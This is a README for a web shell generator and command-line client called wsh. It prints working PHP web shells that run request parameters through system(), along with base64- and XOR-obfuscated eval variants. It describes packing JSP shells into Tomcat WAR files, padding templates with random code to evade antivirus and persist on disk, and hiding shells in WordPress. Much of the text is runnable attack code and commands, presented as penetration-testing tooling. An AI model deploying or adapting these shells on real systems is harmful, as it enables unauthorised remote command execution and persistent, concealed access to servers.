# wsh

wsh (pronounced woosh) is a web shell generator and command line interface. This started off as just an http client since interacting with webshells is a pain. There's a form, to send a command you have to type in an input box and press a button. I wanted something that fits into my workflow better and ran in the terminal. Thus wsh was born.

The client features command history, logging, and can be configured to interact with a previously deployed standard webshell with a form/button. The generator creates webshells in php, asp, and jsp. They are generated with random variables, so each will have a unique hash. They can be configured with a whitelist, passwords, and allow commands to be sent over custom headers and parameters. The generator and client can be configured through command line flags or configuration files to allow for saving a setup that works for you without doing what I call the "--help" dance. Once configured, the client and generator use the same config file.

## Features

- Interact with deployed web shells via the command line
  - Logging
- Generate webshells in PHP, JSP, and ASP
  - IP whitelisting
  - Password protection
  - Send commands over custom headers/parameters
  - File upload / download
  - Base64 encoded shells for asp and php
  - XOR encrypted shells for asp and php

## Usage

### Connect

```
wsh <URL> [flags]

-X, --method string        HTTP method: GET, POST, PUT, PATCH, DELETE (default "GET")
    --param string         Parameter for sending command
    --header string        Header for sending command
-P, --params strings       HTTP request parameters
-H, --headers strings      HTTP request headers
-c, --config string        Config file
-k, --ignore-ssl           Ignore invalid certs
    --log string           Log file
    --prefix string        Prepend command: 'cmd /c', 'powershell.exe', 'bash'
    --timeout int          Request timeout in seconds (default 10)
    --trim-prefix string   Trim output prefix
    --trim-suffix string   Trim output suffix
-h, --help                 help for wsh
```

### Generate

```
wsh generate <language> [flags]
wsh g <language> [flags]

-X, --method string        HTTP method (GET,POST,PUT,PATCH,DELETE) (default "GET")
-p, --param string         Parameter for sending command
    --header string        Header for sending command
-w, --whitelist strings    IP addresses to whitelist
-o, --outfile string       Output file
    --no-file              Disable file upload/download capabilities
    --pass string          Password protect shell
    --pass-header string   Header for sending password
    --pass-param string    Parameter for sending password
    --xor-header string    Header for sending xor key
    --xor-key string       Key for xor encryption
    --xor-param string     Parameter for sending xor key
    --base64               Base64 encode shell
    --minify               Minify webshell code
-t, --template string      Webshell template file
-h, --help                 help for generate
```

### Client usage / File IO

I wanted the client to be language agnostic, so all webshells needed to implement the same upload/download logic. Unfortunately it is a pain to do multipart form uploads natively in jsp and classic asp, so files are uploaded as base64 in a parameter. This is not ideal as the max file upload size is limited to the maximum parameter size. In the future I may try and implement multipart form uploads, or do multiple requests to transfer larger files.

```
$ wsh 127.0.0.1:8080/test.php --param cmd
127.0.0.1> help
get <remote filepath> [local filepath]  Download file
put <local filepath> [remote filepath]  Upload file
clear                                   Clear screen
exit                                    Exits shell
```

## Generator Examples

### Simple Shells

The following commands generates and interacts with a simple php web shell.

```
$ wsh generate php --param cmd --no-file -o shell.php
Created shell at shell.php.

$ wsh 127.0.0.1:8080/shell.php --param cmd
```

```php
<?php
  $MfOb = $_REQUEST['cmd'];
  $MfOb = trim($MfOb);
  system($MfOb);
  die;
?>
```

Commands can also be sent over http headers

```
$ wsh generate php --no-file --header user-agent  -o shell.php
Created shell at shell.php.

$ wsh 127.0.0.1:8080/shell.php --header user-agent
```

### Whitelisting

```
$ wsh generate php --no-file --param cmd -w 127.0.0.1,10.0.23.3 -w 12.4.22.3 -o shell.php
```

### Password Protection

Passwords can be sent over parameters or headers.

```
$ wsh generate php --no-file --param cmd --pass S3cr3t --pass-param pass
$ wsh 127.0.0.1:8080/shell.php --param cmd -P pass:S3cr3t

$ wsh generate php --no-file --param cmd --pass S3cr3t --pass-header pass-header
$ wsh 127.0.0.1:8080/shell.php --param cmd -H pass-header:S3cr3t
```

### Base64 / XOR encryption

This functionality is interesting, but may require some modification of the templates to be made useful. In the case of asp and jsp, the libraries that facilitate decoding base64 are known IOCs and will get flagged. If you are interested in using these functionalities I'd recommend modifying the template and obfuscating.

Same as password protection, the xor key can be sent over a parameter or a header.

```
$ wsh g php --param cmd --no-file --base64
<?php
eval(base64_decode('JEZISENTPSRfUkVRVUVTVFsnY21kJ107JEZISENTPXRyaW0oJEZISENTKTtzeXN0ZW0oJEZISENTKTtkaWU7'))
?>

$ wsh g php --param cmd --no-file --xor-key S3cr3tK3y --xor-param X-Key
<?php
$KHhx = $_REQUEST["X-Key"];
$LqC = base64_decode("d2MPPUdJb2wrFmI2N2AgEBQaPldELwhQG182Jw4XAFoZYxcpP3wXWwgHMkANNl5LVmMYBEdQaFcKFwg=");
$oooqt = "";
for($YpuI=0; $YpuI<strlen($LqC); ) {
  for($cMq=0; ($cMq<strlen($KHhx) && $YpuI<strlen($LqC)); $cMq++,$YpuI++) {
    $oooqt .= $LqC{ $YpuI } ^ $KHhx{ $cMq };
  }
}
eval($oooqt);
?>
```

### Tomcat Shells

To generate a webshell which can be deployed to tomcat, create a jsp shell named index.jsp and run the command below to zip it into a war file.

Occasionally, the tomcat environment does not have the libraries required for file upload/download and the shell will error when a request is made. To remediate this, use the `--no-file` flag.

```
$ wsh g jsp --param cmd --no-file -o index.jsp
$ jar -cvf shell.war index.jsp
```

## Templates

Using the go template library adds alot of flexibility to the generator. Occasionally a webshell will get caught by AV however, I have found that adding in a bunch of random code in the template file will often make the shell look benign enough to allow it to persist on the disk. I have included an example in the templates/covert-php.tml file.

Additionally, you can modify these templates to include your name/contact information for attribution in the use case of a penetration test.

## Client Functionality

### Prefix

A prefix can be specified to prepend a string to each command sent to the shell. This can be used to turn a normal cmd shell into a powershell shell.

```
$ wsh http://10.0.0.27/shell.asp --param cmd --prefix powershell.exe
10.0.0.27> ls
Directory: C:\windows\system32\inetsrv


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/27/2020  11:49 PM                config
d-----        5/27/2020  11:49 PM                en
d-----        5/28/2020  12:25 AM                en-US
-a----        5/27/2020  11:49 PM         119808 appcmd.exe
```

### Logging

Logs are timestamped and include the host being interacted with. Log files are appended, so feel free to use the same log file for multiple sessions/hosts.

```
127.0.0.1:8080/shell.php --param cmd --log localhost.log
Logging to: localhost.log
127.0.0.1> ls
README.md
cmd
example-configs
...

[04/20/2020 12:02:17] 127.0.0.1> ls
README.md
cmd
example-configs
```

### Trim prefix/suffix

The client can be configured to trim extraneous html content from a request, this is useful when interacting with standard html interface webshells, or maybe if a generated shell is sneakily embedded in a wordpress installation.

```
$ wsh 127.0.0.1:8080/index.php -X POST --param cmd
127.0.0.1> ls
. . .
        <div class="pb-2 mt-4 mb-2">
            <h2> Output </h2>
        </div>
        <pre>
README.md
cmd
example-configs
index.php
main.go
templates
        </pre>
    </div>
. . .

$ wsh 127.0.0.1:8080/index.php -X POST --param cmd --trim-prefix '<pre>' --trim-suffix '</pre>'
127.0.0.1> ls
README.md
cmd
example-configs
index.php
main.go
templates
```
